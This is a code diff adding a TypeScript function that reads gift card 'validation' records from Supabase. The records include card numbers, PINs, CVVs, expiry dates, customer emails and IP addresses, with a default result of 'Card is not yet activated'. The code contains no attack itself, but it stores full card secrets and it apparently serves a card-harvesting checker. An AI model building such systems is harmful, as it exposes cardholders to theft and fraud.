@@ -362,3 +362,57 @@ export async function checkSupabaseHealth(): Promise<{
     };
   }
 }
+
+/**
+ * Fetches all saved validation records directly from Supabase.
+ */
+export async function fetchValidationsFromSupabase(): Promise<any[]> {
+  const client = getSupabaseClient();
+  if (!client) return [];
+
+  try {
+    const tableName = await getActiveTableName(client);
+    const { data, error } = await client
+      .from(tableName)
+      .select('*')
+      .order('created_at', { ascending: false });
+
+    if (error || !Array.isArray(data)) return [];
+
+    return data.map((row) => {
+      let imagesArr: string[] = [];
+      try {
+        if (typeof row.images === 'string') {
+          imagesArr = JSON.parse(row.images);
+        } else if (Array.isArray(row.images)) {
+          imagesArr = row.images;
+        }
+      } catch {
+        imagesArr = [];
+      }
+
+      return {
+        id: String(row.id || ''),
+        brand: String(row.brand || 'Gift Card'),
+        cardNumber: String(row.card_number || row.cardNumber || ''),
+        pin: row.pin ? String(row.pin) : null,
+        cvv: row.cvv ? String(row.cvv) : null,
+        expiryDate: row.expiry_date || row.expiryDate ? String(row.expiry_date || row.expiryDate) : null,
+        currency: String(row.currency || 'USD'),
+        cardAmount: Number(row.card_amount || row.cardAmount || 0),
+        status: String(row.status || 'PENDING'),
+        result: String(row.result || 'Card is not yet activated'),
+        notes: row.notes ? String(row.notes) : null,
+        customerEmail: row.customer_email || row.customerEmail ? String(row.customer_email || row.customerEmail) : null,
+        customerIp: row.customer_ip || row.customerIp ? String(row.customer_ip || row.customerIp) : null,
+        images: JSON.stringify(imagesArr),
+        createdAt: row.created_at ? new Date(row.created_at) : new Date(),
+        updatedAt: row.updated_at ? new Date(row.updated_at) : new Date(),
+      };
+    });
+  } catch (err) {
+    console.warn('[Supabase] Failed to fetch validation records:', err);
+    return [];
+  }
+}
+
